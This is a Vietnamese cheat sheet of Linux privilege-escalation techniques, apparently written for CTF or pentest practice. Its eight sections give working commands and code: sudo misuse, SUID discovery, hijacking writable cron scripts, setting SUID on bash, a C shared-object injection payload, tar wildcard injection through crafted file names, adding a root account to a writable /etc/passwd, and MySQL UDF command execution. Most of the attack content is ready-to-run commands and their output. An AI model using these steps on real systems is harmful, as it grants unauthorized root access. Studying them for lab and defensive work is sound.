# 1. sudo -l

Điều đầu tiên cần làm là check xem user hiện tại có quyền gì không? Được như bên dưới thì ngon:

```shell
$ sudo -l
User example may run the following commands on localhost:
   ... NOPASSWD: /bin/bash
   ...
```

Đơn giản là có thể chạy với quyền sudo mà không cần password gì, lúc này chỉ cần `sudo /bin/bash` cái là ngon.
> Lưu ý: phải chạy y sì thằng `NOPASSWD` (`sudo /bin/bash`, chứ không phải `sudo bash` :)))

# 2. SUID

Tìm các file có SUID Bit:

```shell
$ find / -perm -u=s -type f 2>/dev/null
```

Sau đó tham khảo cách "mượn quyền" tại trang [này](https://gtfobins.github.io/)

# 3. crontab

List các cronjobs:

```console
$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Example:

```console
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

Dựa vào kết quả trên, check quyền của file được đặt cronjob bằng `ls -la` xem có thể edit được không. Như ở trên có file `/var/www/html/booked/cleanup.py` có vẻ khả quan, nếu có quyền `wr` thì chỉ cần thay thế nội dung là xong.

# 4. Bash SUID

Nếu trong trường hợp ta có thể `setuid` (`chmod +s`) cho `bash`, có thể làm như sau:

```console
$ chmod +s /bin/bash
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 25 01:40 /bin/bash
$ /bin/bash -p
bash-5.12# id
uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
```

# 5. Shared object injection.

Nếu gặp 1 process nào đó chạy với quyền root, sử dụng một shared object file (.so) và có quyền ghi trong thư mục chứa .so đó, hoặc là có quyền ghi với chính file .so đó luôn, có thể thực hiện so injection.

```c 
// pwn.c 
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("some_cmd");
}
```

Gửi file đó lên victim, và compile:

```console 
$ gcc -shared -fPIC -nostartfiles -o so_file_name.so pwn.c 
```

Nếu gặp phải lỗi **"gcc: error trying to exec ‘cc1‘: execvp: No such file or directory"** thì có thể làm thế này:

```console 
$ find /usr/ -name "*cc1*" 2>/dev/null
...
...
/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc
...
...

$ export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
```

# 6. Wildcard injection

Với một số tool nén file như `tar`, `zip`, `rync` và `7z`, có options cho phép chạy câu lệnh hệ thống, và đây là điều xảy ra khi thay tên file thành các options đó.

Ví dụ, có một cronjob như sau:

```console 
$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
...
...
*/3 * * * * root /opt/backup.sh
```

Check perms của `/opt/backup.sh`:

```console 
$ ls -l /opt/backup.sh
-rwxr--r-- 1 root root 63 Aug 30 15:49 backup.sh
```

Nội dung của `/opt/backup.sh`:

```console 
$ cat /opt/backup.sh
#!/bin/bash

cd /var/www/html
tar -cf /opt/backup/backup.tgz *
```

Exploit:

```console
$ cd /var/www/html
$ echo -e '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
```

Lúc này trong `/var/www/html` sẽ có 3 file như sau:

```console 
$ ls
...
...
'--checkpoint=1'
'--checkpoint-action=exec=sh shell.sh'
...
...
shell.sh
```

Đợi khoảng 3 phút, ta thấy `bash` đã được set SUID:

```console
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 28 01:40 /bin/bash
```

Đến bước này chỉ cần:
```console
$ /bin/bash -p

bash-5.1# id
uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
```

Ngoài ra còn nhiều trò khác tại [đây](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) và [đây](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

# 7. /etc/passwd với OpenSSL

Trong vài trường hợp, file `/etc/passwd` được set quyền khá vớ vẩn như dưới:

```console
$ ls -l /etc/passwd
-rw-r--r-- 1 user root 1.2K Jun  9 10:22 /etc/passwd
```

Có thể thấy `user` có thể edit cái file này, ta có thể add thêm 1 user (ví dụ `user1`:`toor`) với quyền root bằng OpenSSL như sau:

```console
$ openssl passwd -1 -salt user1 toor
$1$user1$ZKmj13YYdAml8T8Cwi/j9/
```

Đưa vào `/etc/passwd` với format sau:

`<username>:<chuỗi lấy ở trên>:0:0::/root:/bin/bash`

```console
$ echo 'user1:$1$user1$ZKmj13YYdAml8T8Cwi/j9/:0:0::/root:/bin/bash' >> /etc/passwd
```

Giờ có thể sử dụng `su` hoặc `ssh`:

```console
$ su user1
# id
uid=0(user1) gid=0(root) groups=0(root)
```

# 8. User Defined Function in MySQL

Trong trường hợp chúng ta truy cập được vào root của MySQL, hoặc một user MySQL nào đó có quyền đọc database 'mysql', có thể thử:

```console
MySQL [(none)]> use mysql
```

```console
MySQL [mysql]> show variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.001 sec)
```

Nếu kết quả trả về như trên, ta có thể PrivEsc bằng UDF.
Tải file `raptor_udf2.c` từ [đây](https://www.exploit-db.com/exploits/1518) và compile:

```console
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 
```

Tìm một thư mục nào đó trên máy victim mà ta có quyền ghi:

```console
$ find / -type d -writable 2>/dev/null
...
...
/var/www/html
...
```

Với ví dụ trên là `/var/www/html`
Download file `raptor_udf2.so` về thư mục `/var/www/html` trên máy victim.
Quay lại với MySQL console:

```console
MySQL [mysql]> show variables like '%plugin%';
+-----------------+------------------------+
| Variable_name   | Value                  |
+-----------------+------------------------+
| plugin_dir      | /usr/lib/mysql/plugin/ |
+-----------------+------------------------+
1 rows in set (0.001 sec)
```

Note lại cái `plugin_dir` kia, tạo 1 bảng `foo`:

```console
MySQL [mysql]> create table foo(line blob);
```

Insert file `raptor_udf2.so` vào `foo`:

```console
MySQL [mysql]> insert into foo values(load_file('/var/www/raptor_udf2.so'));
```

Tạo plugin trong thư mục `plugin_dir` đã note:

```console
MySQL [mysql]> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```

Tạo function để gọi câu lệnh hệ thống:

```console
MySQL [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
```

Check lại xem function đã được tạo chưa:

```console
MySQL [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
```

PrivEsc:

```console
MySQL [mysql]> select do_system('chmod +s /bin/bash');
```

Và sử dụng `/bin/bash -p` như mục #4 có đề cập là lên được root:

```console
$ /bin/bash -p
bash-5.12# id
uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
```
